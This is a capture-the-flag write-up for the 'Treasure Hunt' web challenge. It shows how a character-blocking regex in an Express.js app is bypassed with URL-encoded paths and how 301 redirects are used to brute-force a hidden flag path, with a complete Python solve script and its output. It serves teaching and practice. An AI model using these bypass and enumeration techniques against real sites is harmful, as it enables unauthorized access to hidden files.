# Treasure Hunt

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 71 solves / 116 points
- Author: @ark
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Can you find a treasure?

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-7-Web/images/Pasted%20image%2020241201150730.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-7-Web/images/Pasted%20image%2020241201150816.png)

In here, we can go to different paths, such as `/book`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-7-Web/images/Pasted%20image%2020241201150900.png)

Which is just a book emoji.

However, if we go to `/alpaca`, it says "Bad URL: /alpaca":

![](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-7-Web/images/Pasted%20image%2020241201150953.png)

Hmm... Why is that? Let's read the source code of this web application and figure out why.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-7-Web/Treasure-Hunt/treasure-hunt.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Treasure-Hunt)-[2024.12.01|15:10:58(HKT)]
└> file treasure-hunt.tar.gz 
treasure-hunt.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 51200
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Treasure-Hunt)-[2024.12.01|15:11:00(HKT)]
└> tar xvzf treasure-hunt.tar.gz 
treasure-hunt/
treasure-hunt/compose.yaml
treasure-hunt/web/
treasure-hunt/web/index.js
treasure-hunt/web/package.json
treasure-hunt/web/package-lock.json
treasure-hunt/web/Dockerfile
treasure-hunt/web/public/
treasure-hunt/web/public/key
[...]
```

After reading the source code, we can find that this is a very simple web application written in JavaScript with Express.js framework.

In `web/Dockerfile`, we can also see that the flag file is in a very weird path:

```bash
# Create flag.txt
RUN echo 'Alpaca{REDACTED}' > ./flag.txt

# Move flag.txt to $FLAG_PATH
RUN FLAG_PATH=./public/$(md5sum flag.txt | cut -c-32 | fold -w1 | paste -sd /)/f/l/a/g/./t/x/t \
    && mkdir -p $(dirname $FLAG_PATH) \
    && mv flag.txt $FLAG_PATH
```

Assume the flag's MD5 hash is `3876917cbd1b3db12e39587c66ac2891`, the flag path is something like this:

```
./public/3/8/7/6/9/1/7/c/<snipped_md5_hash_path>/8/9/1/f/l/a/g/t/x/t
```

Hmm... So we'll need to brute force the flag's MD5 hash and get the correct path?

Anyway, why path `/alpaca` will return bad URL?

If we take a look at `web/index.js`, we can see that every requests must go through this [middleware](https://expressjs.com/en/guide/using-middleware.html):

```javascript
app.use((req, res, next) => {
  res.type("text");
  if (/[flag]/.test(req.url)) {
    res.status(400).send(`Bad URL: ${req.url}`);
    return;
  }
  next();
});
```

In here, if our request's URL path has character `f`, `l`, `a`, or `g`, it'll return HTTP status 400 with data `Bad URL: <our_path>`.

In the above case, path `/alpaca` has character `a`, which matched the regular expression pattern, thus returning bad URL.

Hmm... Wait, will `req.url` automatically perform URL decode? Maybe we can **bypass it via URL encoding**?

Let's log `req.url` and check it out!

```javascript
app.use((req, res, next) => {
  console.log("[DEBUG] req.url", req.url);
  
  res.type("text");
  if (/[flag]/.test(req.url)) {
    res.status(400).send(`Bad URL: ${req.url}`);
    return;
  }
  next();
});
```

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Treasure-Hunt)-[2024.12.01|15:27:15(HKT)]
└> cd treasure-hunt 
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Treasure-Hunt/treasure-hunt)-[2024.12.01|15:27:15(HKT)]
└> docker compose up --build
[...]
Attaching to treasure-hunt-1
```

```http
GET /%61%6c%70%61%63%61 HTTP/1.1
Host: localhost:3000


```

Response:

```http
HTTP/1.1 200 OK
[...]

🦙

```

Log message:

```shell
treasure-hunt-1  | [DEBUG] req.url /%61%6c%70%61%63%61
```

Nope, it doesn't URL decode our path, and we successfully bypassed the filter!

Now, how can we brute force the flag's path?

After some trial and error, it seems like when the requested resource is a directory and missing a forward slash like `/1`, we'll be redirected to the correct path, such as `/1/`:

```http
GET /3 HTTP/1.1
Host: localhost:3000


```

Response:

```http
HTTP/1.1 301 Moved Permanently
[...]
Location: /3/
[...]

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Redirecting</title>
</head>
<body>
<pre>Redirecting to /3/</pre>
</body>
</html>
```

## Exploitation

With that said, we can write a Python script to brute force the correct path and get the flag!

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import http.client
from string import hexdigits

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.connection = http.client.HTTPConnection(self.baseUrl.split('http://')[1])
        self.MD5_CHARACTER_SET = hexdigits
        self.MD5_HEX_LENGTH = 32

    def urlEncodeCharacter(character):
        return f'%{ord(character):x}'
    
    def bruteForceFlag(self):
        flagHash = str()
        finalPath = '/'
        while True:
            for character in self.MD5_CHARACTER_SET:
                if len(flagHash) == self.MD5_HEX_LENGTH:
                    print(f'\n[+] Got flag MD5 hash: {flagHash}')
                    return finalPath

                print(f'[*] Brute forcing character "{character}"', end='\r')
                encodedCharacter = Solver.urlEncodeCharacter(character)
                path = f'/{encodedCharacter}' if finalPath == '/' else f'{finalPath}/{encodedCharacter}'
                self.connection.request("GET", path)
                response = self.connection.getresponse()
                response.read()

                isCorrectCharacter = True if response.status == 301 else False
                if not isCorrectCharacter:
                    continue
                
                finalPath += f'{encodedCharacter}/'
                flagHash += character
                break

    def getFlag(self, flagHashPath):
        finalPath = flagHashPath
        for character in ['f', 'l', 'a', 'g', 't', 'x', 't']:
            encodedCharacter = Solver.urlEncodeCharacter(character)
            finalPath += f'{encodedCharacter}/'

        finalPath = finalPath.rstrip('/')
        print(f'[*] Getting the flag via path: {finalPath}')

        self.connection.request("GET", finalPath)
        response = self.connection.getresponse()
        data = response.read()
        flag = data.decode().strip()
        print(f'[+] Flag: {flag}')

    def solve(self):
        flagHashPath = self.bruteForceFlag()
        self.getFlag(flagHashPath)

if __name__ == '__main__':
    # baseUrl = 'http://localhost:3000' # for local testing
    baseUrl = 'http://34.170.146.252:19843'
    solver = Solver(baseUrl)

    solver.solve()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-7-(Web)/Treasure-Hunt)-[2024.12.01|16:15:11(HKT)]
└> python3 solve.py
[*] Brute forcing character "f"
[+] Got flag MD5 hash: 4bafb19a7b66cb415eb070ce1a1b2e8f
[*] Getting the flag via path: /%34/%62/%61/%66/%62/%31/%39/%61/%37/%62/%36/%36/%63/%62/%34/%31/%35/%65/%62/%30/%37/%30/%63/%65/%31/%61/%31/%62/%32/%65/%38/%66/%66/%6c/%61/%67/%74/%78/%74
[+] Flag: Alpaca{alpacapacapacakoshitantan}
```

- **Flag: `Alpaca{alpacapacapacakoshitantan}`**

## Conclusion

What we've learned:

1. Regular expression bypass via URL encoding